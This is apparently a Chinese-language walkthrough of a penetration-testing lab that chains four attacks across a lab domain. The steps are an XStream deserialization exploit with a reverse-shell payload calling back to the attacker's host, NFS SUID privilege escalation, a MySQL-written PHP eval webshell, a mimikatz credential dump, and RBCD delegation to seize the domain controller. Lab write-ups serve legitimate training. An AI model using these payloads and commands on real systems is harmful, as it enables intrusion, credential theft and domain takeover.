云镜靶场，这个相对简单，并且关卡列表是有提示的。

## 关卡剧情

  1. 关卡剧情：  
请测试 Delivery 暴露在公网上的 Web 应用的安全性，并尝试获取在该服务器上执行任意命令的能力。

  2. 关卡剧情：  
为了实现跨机器和跨操作系统的文件共享，管理员在内网部署了
NFS，然而这个决策却使得该服务器陷入了潜在的安全风险。你的任务是尝试获取该服务器的控制权，以评估安全性。

  3. 关卡剧情：  
请尝试获取内网中运行 OA 系统的服务器权限，并获取该服务器上的机密文件。

  4. 关卡剧情：  
由于域管理员错误的配置，导致域内某个用户拥有危险的 DACL。你的任务是找到该用户，并评估这个配置错误所带来的潜在危害。

大致感觉就是 某Web应用存在RCE，内网某机器可利用NFS提权，某OA存在RCE，最后某个域用户拥有WriteDacl权限可以直接dump hash。

## flag01

fscan 39.99.157.8 查看开放端口

![image-20230826161719199](https://image.3001.net/images/20230826/16930378453533.png!small)

ftp pom.xml内容为

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
        <parent>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-parent</artifactId>
            <version>2.7.2</version>
            <relativePath/> <!-- lookup parent from repository -->
        </parent>
        <groupId>com.example</groupId>
        <artifactId>ezjava</artifactId>
        <version>0.0.1-SNAPSHOT</version>
        <name>ezjava</name>
        <description>ezjava</description>
        <properties>
            <java.version>1.8</java.version>
        </properties>
        <dependencies>
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-thymeleaf</artifactId>
            </dependency>
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-web</artifactId>
            </dependency>
    
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-test</artifactId>
                <scope>test</scope>
            </dependency>
    
            <dependency>
                <groupId>com.thoughtworks.xstream</groupId>
                <artifactId>xstream</artifactId>
                <version>1.4.16</version>
            </dependency>
    
            <dependency>
                <groupId>commons-collections</groupId>
                <artifactId>commons-collections</artifactId>
                <version>3.2.1</version>
            </dependency>
        </dependencies>
    
        <build>
            <plugins>
                <plugin>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-maven-plugin</artifactId>
                </plugin>
            </plugins>
        </build>
    
    </project>
    

XStream版本1.4.16 存在漏洞 CVE-2021-29505

https://cloud.tencent.com/developer/article/1839233

8080端口

![image-20230826162456628](https://image.3001.net/images/20230826/16930383023776.png!small)

    
    
    java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,xxxx==}|{base64,-d}|{bash,-i}"
    
    
    
    POST /just_sumbit_it HTTP/1.1
    Host: 39.99.157.8:8080
    Content-Length: 3113
    Accept: application/xml, text/xml, */*; q=0.01
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 S!smallafari/537.36
    Content-Type: application/xml;charset=UTF-8
    Origin: http://39.99.157.8:8080
    Referer: http://39.99.157.8:8080/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Connection: close
    
    <java.util.PriorityQueue serialization='custom'>    <unserializable-parents/>
        <java.util.PriorityQueue>
            <default>
                <size>2</size>
            </default>
            <int>3</int>
            <javax.naming.ldap.Rdn_-RdnEntry>
                <type>12345</type>
                <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                    <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
                </value>
            </javax.naming.ldap.Rdn_-RdnEntry>
            <javax.naming.ldap.Rdn_-RdnEntry>
                <type>12345</type>
                <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                    <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                        <parsedMessage>true</parsedMessage>
                        <soapVersion>SOAP_11</soapVersion>
                        <bodyParts/>
                        <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                            <attachmentsInitialized>false</attachmentsInitialized>
                            <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                                <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                    <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                        <names>
                                            <string>aa</string>
                                            <string>aa</string>
                                        </names>
                                        <ctx>
                                            <environment/>
                                            <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                                <java.rmi.server.RemoteObject>
                                                    <string>UnicastRef</string>
                                                    <string>47.xx.xxx.xxx</string>
                                                    <int>1099</int>
                                                    <long>0</long>
                                                    <int>0</int>
                                                    <long>0</long>
                                                    <short>0</short>
                                                    <boolean>false</boolean>
                                                </java.rmi.server.RemoteObject>
                                            </registry>
                                            <host>47.xx.xxx.xxx</host>
                                            <port>1099</port>
                                        </ctx>
                                    </candidates>
                                </aliases>
                            </nullIter>
                        </sm>
                    </message>
                </value>
            </javax.naming.ldap.Rdn_-RdnEntry>
        </java.util.PriorityQueue>
    </java.util.PriorityQueue>
    

![image-20230826171144623](https://image.3001.net/images/20230826/16930411093917.png!small)

写个公钥上去

    
    
    echo 'ssh-rsa xxxxxxxxxxxxxxxxx'>>authorized_keys
    

直接登陆，为了方便后续操作顺便把socks代理开了

    
    
    ssh -i id_rsa root@39.99.227.50 -D 0.0.0.0:1080
    

## flag02

![image-20230827003740487](https://image.3001.net/images/20230827/1693067866662.png!small)

上fscan扫内网

    
    
    ./fscan_386 -h 172.22.13.1/24
    
       ___                              _
      / _ \     ___  ___ _ __ __ _  ___| | __
     / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
    / /_\\_____\__ \ (__| | | (_| | (__|   <
    \____/     |___/\___|_|  \__,_|\___|_|\_\
                         fscan version: 1.8.2
    start infoscan
    (icmp) Target 172.22.13.14 !small   is alive
    (icmp) Target 172.22.13.6  !small   is alive
    (icmp) Target 172.22.13.28 !small   is alive
    (icmp) Target 172.22.13.57 !small   is alive
    [*] Icmp alive hosts len is: 4
    172.22.13.14:8080 open
    172.22.13.28:8000 open
    172.22.13.28:3306 open
    172.22.13.6:445 open
    172.22.13.28:135 open
    172.22.13.28:445 open
    172.22.13.6:139 open
    172.22.13.28:139 open
    172.22.13.6:135 open
    172.22.13.57:80 open
    172.22.13.28:80 open
    172.22.13.57:22 open
    172.22.13.14:80 open
    172.22.13.14:22 open
    172.22.13.6:88 open
    172.22.13.14:21 open
    [*] alive ports len is: 16
    start vulscan
    [*] NetInfo:
    [*]172.22.13.28
       [->]WIN-HAUWOLAO
       [->]172.22.13.28
    [*] WebTitle: http://172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台
    [*] WebTitle: http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
    [*] NetBios: 172.22.13.6     [+]DC XIAORANG\WIN-DC
    [*] WebTitle: http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS
    [+] ftp://172.22.13.14:21:anonymous
       [->]1.txt
       [->]pom.xml
    [*] NetInfo:
    [*]172.22.13.6
       [->]WIN-DC
       [->]172.22.13.6
    [*] NetBios: 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393
    [*] WebTitle: http://172.22.13.14:8080  code:200 len:3655   title:公司发货单
    [*] WebTitle: http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.
    [+] mysql:172.22.13.28:3306:root 123456
    已完成 16/16
    [*] 扫描结束,耗时: 18.540547821s
    

根据关卡剧情提示，内网部署了NFS NFS默认端口是2049，我们利用fscan重点探测一下

    
    
    root@ubuntu:/tmp# ./fscan_386 -h 172.22.13.1/24 -p 2049
    ./fscan_386 -h 172.22.13.1/24 -p 2049
    
       ___                              _
      / _ \     ___  ___ _ __ __ _  ___| | __
     / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
    / /_\\_____\__ \ (__| | | (_| | (__|   <
    \____/     |___/\___|_|  \__,_|\___|_|\_\
                         fscan version: 1.8.2
    start infoscan
    (icmp) Target 172.22.13.14 !small   is alive
    (icmp) Target 172.22.13.6  !small   is alive
    (icmp) Target 172.22.13.28 !small   is alive
    (icmp) Target 172.22.13.57 !small   is alive
    [*] Icmp alive hosts len is: 4
    172.22.13.57:2049 open
    

整理一下得知，一共四台主机

172.22.13.14 本机 存在flag01

172.22.13.6 域控

172.22.13.28 存在OA

172.22.13.57 NFS

查看172.22.13.57 nfs 共享信息

    
    
    showmount -e 172.22.13.57
    

![image-20230827010319867](https://image.3001.net/images/20230827/16930694039573.png!small)

C 需要安装nfs客户端

    
    
    apt install nfs-common
    查看共享信息
    showmount -e 172.22.13.57 
    挂载
    mount -t nfs 172.22.13.57:/home/joyce joyce/ -o nolock
    

挂载以后 还是一样我们写一个SSH公钥到172.22.13.57 上去

![image-20230827145416465](https://image.3001.net/images/20230827/16931192677120.png!small)

创建.ssh文件夹写公钥上去后连接

    
    
    proxychains4 ssh -i id_rsa joyce@172.22.13.57
    

![image-20230827145204877](https://image.3001.net/images/20230827/16931191324057.png!small)

接下来就是提权环节

从根目录中 查找有suid权限的文件，并且属主是root

    
    
    find / -user root -perm -4000 -print 2>/dev/null
    

![image-20230827150156769](https://image.3001.net/images/20230827/16931197256940.png!small)

网上很多WP都是利用ftp的suid权限提权的。

这里换一种方法，回到172.22.13.14机器挂载nfs目录制作一个有suid权限的shell

是由于某个参数设置的问题，本机mount nfs远程共享之后, 本机以root权限设置了一个suid, 远程那边的文件也会拥有这个权限（xz教的）

    
    
    #include<unistd.h>
    void main()
    {
            setuid(0);
            setgid(0);
            system("bash");
    }
    

![image-20230827152954889](https://image.3001.net/images/20230827/16931214095078.png!small)

    
    
    vim pwn.c
    gcc pwn.c -o pwn
    chmod +s pwn
    

![image-20230827153424073](https://image.3001.net/images/20230827/16931216702627.png!small)

在 172.22.13.57 centos上看已经被共享过来了。并且有suid权限

![image-20230827154309589](https://image.3001.net/images/20230827/16931221943514.png!small)

域用户凭据，后面会有用。

    
    
    [root@centos ~]# cat /pAss.txt
    xiaorang.lab/zhangwen\QT62f3gBhK1
    

## flag03

现在回过头看 172.22.13.28的OA 好像没办法利用

![image-20230827154935661](https://image.3001.net/images/20230827/16931225783426.png!small)

前面fscan扫到了 MySQL的弱口令 还是root

    
    
    [+] mysql:172.22.13.28:3306:root 123456
    

权限很大，链接上去以后直接写webshell上去

PHPstudy那么直接在www目录下写shell

    
    
    select '<?php eval($_POST[cmd]);?>' into outfile 'C:\\phpstudy_pro\\www\\cmd.php';
    

![image-20230827161351692](https://image.3001.net/images/20230827/16931240356215.png!small)

![image-20230827162502686](https://image.3001.net/images/20230827/16931247055741.png!small)

确实写上去了，哥斯拉链接。

![image-20230827162427753](https://image.3001.net/images/20230827/16931246731980.png!small)

## flag04

    
    
    .\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
    
    
    
    .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)!small
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com!small )
     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com!small )
      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
    
    mimikatz(commandline) # privilege::debug
    Privilege '20' OK
    
    mimikatz(commandline) # sekurlsa::logonPasswords
    
    Authentication Id : 0 ; 139678 (00000000:0002219e)
    Session           : Service from 0
    User Name         : chenglei
    Domain            : XIAORANG
    Logon Server      : WIN-DC
    Logon Time        : 2023/8/27 14:14:19
    SID               : S-1-5-21-3269458654-3569381900-10559451-1105
    	msv :	
    	 [00000003] Primary
    	 * Username : chenglei
    	 * Domain   : XIAORANG
    	 * NTLM     : 0c00801c30594a1b8eaa889d237c5382
    	 * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7
    	 * DPAPI    : 89b179dc738db098372c365602b7b0f4
    	tspkg :	
    	wdigest :	
    	 * Username : chenglei
    	 * Domain   : XIAORANG
    	 * Password : (null)
    	kerberos :	
    	 * Username : chenglei
    	 * Domain   : XIAORANG.LAB
    	 * Password : Xt61f3LBhg1
    	ssp :	
    	credman :	
    
    Authentication Id : 0 ; 52875 (00000000:0000ce8b)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2023/8/27 14:14:15
    SID               : S-1-5-90-0-1
    	msv :	
    	 [00000003] Primary
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : XIAORANG
    	 * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d
    	 * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f
    	tspkg :	
    	wdigest :	
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : XIAORANG
    	 * Password : (null)
    	kerberos :	
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : xiaorang.lab
    	 * Password : `k+hcEDFvtzoObj=>DvzxiNqwyEn;Eu-\zFVAh>.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB'LLG6wSx6TR%m;`Nfr;;Hf8O'Szfl0Z=w+^,>0jR
    	ssp :	
    	credman :	
    
    Authentication Id : 0 ; 996 (00000000:000003e4)
    Session           : Service from 0
    User Name         : WIN-HAUWOLAO$
    Domain            : XIAORANG
    Logon Server      : (null)
    Logon Time        : 2023/8/27 14:14:15
    SID               : S-1-5-20
    	msv :	
    	 [00000003] Primary
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : XIAORANG
    	 * NTLM     : 6d056d83c0073bdd64c2f85dca805ff6
    	 * SHA1     : 0765e558f98a929e849981e8079036dfb8b8ff07
    	tspkg :	
    	wdigest :	
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : XIAORANG
    	 * Password : (null)
    	kerberos :	
    	 * Username : win-hauwolao$
    	 * Domain   : XIAORANG.LAB
    	 * Password : 98 f4 ad f3 6e d2 42 4b c6 b2 ef 42 ac 74 60 69 d9 14 69 b2 5d 12 cf 0a 73 e3 65 95 fa d1 bc d8 d8 10 22 a9 f1 cc 7d 0b 8f 65 20 a3 c7 d5 0f 43 b5 c6 cb ce d4 02 e9 7c 14 96 b6 cd 1e 4b 0e 71 b4 bd 09 be f3 0f 0e e1 ea 28 0a 01 f0 05 85 b2 d2 bf a5 82 ec fb e8 49 35 8e c7 23 13 c0 a7 c2 8a 93 b1 46 88 27 8b bc b6 9b d9 aa 3e 39 69 3c bd ff 97 d9 42 bc 8a ac 19 c0 93 23 e4 53 e4 d1 56 f8 e2 ce 36 85 49 c9 65 6f 74 c6 a4 68 d7 65 fb e8 7c d3 68 8b b2 5c 85 8f b7 de 07 2d d5 a6 d6 f3 80 b7 26 18 7c d7 18 72 01 28 00 82 4e 9e a3 e7 cc 66 ea d6 55 80 60 a6 2d bd ef 92 aa ca 30 5d 76 7f 00 3f d9 da 12 4e 46 10 47 04 1f b1 f2 16 4c 71 48 b2 94 ce 47 e2 4a 4d 7e de 6e 19 2b 6e d7 a8 9b 54 c4 50 72 70 db a7 44 94 e7 72 
    	ssp :	
    	credman :	
    
    Authentication Id : 0 ; 139677 (00000000:0002219d)
    Session           : Service from 0
    User Name         : chenglei
    Domain            : XIAORANG
    Logon Server      : WIN-DC
    Logon Time        : 2023/8/27 14:14:19
    SID               : S-1-5-21-3269458654-3569381900-10559451-1105
    	msv :	
    	 [00000003] Primary
    	 * Username : chenglei
    	 * Domain   : XIAORANG
    	 * NTLM     : 0c00801c30594a1b8eaa889d237c5382
    	 * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7
    	 * DPAPI    : 89b179dc738db098372c365602b7b0f4
    	tspkg :	
    	wdigest :	
    	 * Username : chenglei
    	 * Domain   : XIAORANG
    	 * Password : (null)
    	kerberos :	
    	 * Username : chenglei
    	 * Domain   : XIAORANG.LAB
    	 * Password : Xt61f3LBhg1
    	ssp :	
    	credman :	
    
    Authentication Id : 0 ; 997 (00000000:000003e5)
    Session           : Service from 0
    User Name         : LOCAL SERVICE
    Domain            : NT AUTHORITY
    Logon Server      : (null)
    Logon Time        : 2023/8/27 14:14:15
    SID               : S-1-5-19
    	msv :	
    	tspkg :	
    	wdigest :	
    	 * Username : (null)
    	 * Domain   : (null)
    	 * Password : (null)
    	kerberos :	
    	 * Username : (null)
    	 * Domain   : (null)
    	 * Password : (null)
    	ssp :	
    	credman :	
    
    Authentication Id : 0 ; 52848 (00000000:0000ce70)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 2023/8/27 14:14:15
    SID               : S-1-5-90-0-1
    	msv :	
    	 [00000003] Primary
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : XIAORANG
    	 * NTLM     : 6d056d83c0073bdd64c2f85dca805ff6
    	 * SHA1     : 0765e558f98a929e849981e8079036dfb8b8ff07
    	tspkg :	
    	wdigest :	
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : XIAORANG
    	 * Password : (null)
    	kerberos :	
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : xiaorang.lab
    	 * Password : 98 f4 ad f3 6e d2 42 4b c6 b2 ef 42 ac 74 60 69 d9 14 69 b2 5d 12 cf 0a 73 e3 65 95 fa d1 bc d8 d8 10 22 a9 f1 cc 7d 0b 8f 65 20 a3 c7 d5 0f 43 b5 c6 cb ce d4 02 e9 7c 14 96 b6 cd 1e 4b 0e 71 b4 bd 09 be f3 0f 0e e1 ea 28 0a 01 f0 05 85 b2 d2 bf a5 82 ec fb e8 49 35 8e c7 23 13 c0 a7 c2 8a 93 b1 46 88 27 8b bc b6 9b d9 aa 3e 39 69 3c bd ff 97 d9 42 bc 8a ac 19 c0 93 23 e4 53 e4 d1 56 f8 e2 ce 36 85 49 c9 65 6f 74 c6 a4 68 d7 65 fb e8 7c d3 68 8b b2 5c 85 8f b7 de 07 2d d5 a6 d6 f3 80 b7 26 18 7c d7 18 72 01 28 00 82 4e 9e a3 e7 cc 66 ea d6 55 80 60 a6 2d bd ef 92 aa ca 30 5d 76 7f 00 3f d9 da 12 4e 46 10 47 04 1f b1 f2 16 4c 71 48 b2 94 ce 47 e2 4a 4d 7e de 6e 19 2b 6e d7 a8 9b 54 c4 50 72 70 db a7 44 94 e7 72 
    	ssp :	
    	credman :	
    
    Authentication Id : 0 ; 23817 (00000000:00005d09)
    Session           : UndefinedLogonType from 0
    User Name         : (null)
    Domain            : (null)
    Logon Server      : (null)
    Logon Time        : 2023/8/27 14:14:15
    SID               : 
    	msv :	
    	 [00000003] Primary
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : XIAORANG
    	 * NTLM     : 6d056d83c0073bdd64c2f85dca805ff6
    	 * SHA1     : 0765e558f98a929e849981e8079036dfb8b8ff07
    	tspkg :	
    	wdigest :	
    	kerberos :	
    	ssp :	
    	credman :	
    
    Authentication Id : 0 ; 999 (00000000:000003e7)
    Session           : UndefinedLogonType from 0
    User Name         : WIN-HAUWOLAO$
    Domain            : XIAORANG
    Logon Server      : (null)
    Logon Time        : 2023/8/27 14:14:15
    SID               : S-1-5-18
    	msv :	
    	tspkg :	
    	wdigest :	
    	 * Username : WIN-HAUWOLAO$
    	 * Domain   : XIAORANG
    	 * Password : (null)
    	kerberos :	
    	 * Username : win-hauwolao$
    	 * Domain   : XIAORANG.LAB
    	 * Password : (null)
    	ssp :	
    	credman :	
    
    mimikatz(commandline) # exit
    Bye!
    

抓到chegnlei Xt61f3LBhg1

BloodHound 来进行一波信息收集

    
    
    proxychains4 bloodhound-python -u chenglei -p 'Xt61f3LBhg1' -d xiaorang.lab -c all -ns 172.22.13.6 --zip --dns-tcp
    

![image-20230827165342200](https://image.3001.net/images/20230827/16931264294354.png!small)

![image-20230827175133420](https://image.3001.net/images/20230827/16931298979140.png!small)

ACL Admins 组对 WIN-DC 具有 WriteDacl 权限, 那么可以直接写 DCSync / RBCD / Shadow
Credentials 可操作性就很大了

这里以委派举例

    
    
    proxychains4 addcomputer.py XIAORANG.LAB/chenglei:'Xt61f3LBhg1' -dc-ip 172.22.13.6 -dc-host XIAORANG.LAB -computer-name 'TEST$' -computer-pass 'testtest'
    

委派指定的账户必须得是服务账户(也就是具有spn的账户) (机器账户是服务账户的一种)所以创建了个test$的机器账户  
（xz教的）

    
    
    proxychains4 rbcd.py xiaorang.lab/chenglei:'Xt61f3LBhg1' -dc-ip 172.22.13.6 -action write -delegate-to 'WIN-DC$' -delegate-from 'TEST$'
    

配置资源委派的ldap属性

    
    
    proxychains4 getST.py xiaorang.lab/'TEST$':'testtest' -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6
    

正常走委派的流程, 用委派过程中的S4U协议生成请求目标机器的ST

    
    
    KRB5CCNAME=/Users/sch0lar/sec/impacket/examples/administrator.ccache proxychains4 python3 psexec.py xiaorang.lab/administrator@WIN-DC.xiaorang.lab -k -no-pass -target-ip 172.22.13.6 -codec gbk
    

![image-20230827182240269](https://image.3001.net/images/20230828/16931894894174.png!small)

使用申请到的票据登陆DC

![image-20230827182359505](https://image.3001.net/images/20230827/16931318427266.png!small)

